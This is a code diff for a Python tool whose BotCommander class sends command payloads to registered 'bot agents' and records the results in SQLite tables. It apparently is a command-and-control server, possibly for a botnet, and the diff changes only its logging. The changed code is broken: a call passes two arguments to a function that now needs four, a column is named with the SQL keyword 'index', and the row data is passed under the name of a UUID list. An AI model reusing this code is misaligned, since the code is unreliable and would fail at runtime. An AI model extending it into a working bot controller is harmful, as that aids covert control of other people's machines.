@@ -233,7 +233,7 @@ class BotCommander:
         for elem in self.target_list:
             uuid, = elem
             await asyncio.wait_for(self.__send_cmd_to_bot_agent(uuid, payload), timeout=60)
-        self.db.add_agent_events(self.success_list)
+        self.db.add_agent_events(self.success_list, command, )
 
     async def __send_cmd_to_bot_agent(self, uuid, payload):
         try:
@@ -501,7 +501,8 @@ class CommanderDatabase:
             CREATE TABLE IF NOT EXISTS BotAgents
             (id TEXT PRIMARY KEY, hostname TEXT, address TEXT, online INTEGER, os TEXT);
             CREATE TABLE IF NOT EXISTS CommandHistory
-            (id TEXT, time TEXT, event TEXT, event_detail TEXT, response TEXT, FOREIGN KEY (id) REFERENCES BotAgents (id));
+            (index INTEGER PRIMARY KEY AUTOINCREMENT, time TEXT, id TEXT, event TEXT, event_detail TEXT, response TEXT,
+             FOREIGN KEY (id) REFERENCES BotAgents (id));
             ''')
         return self.query_wrapper("executescript", "CREATE", query)
 
@@ -525,8 +526,8 @@ class CommanderDatabase:
             query = ("SELECT id FROM BotAgents WHERE online = ?", (1,))
         return self.query_wrapper("execute", "SELECT", query)
 
-    def add_agent_events(self, uuid_list: list):
-        query = ("INSERT INTO CommandHistory")
+    def add_agent_events(self, uuid_list, event, event_detail, response_list):
+        query = ("INSERT INTO CommandHistory(time, id, event, event_detail, response) VALUES (?, ?, ?, ?, ?)", uuid_list)
         return self.query_wrapper("executemany", "INSERT", query)
 
 
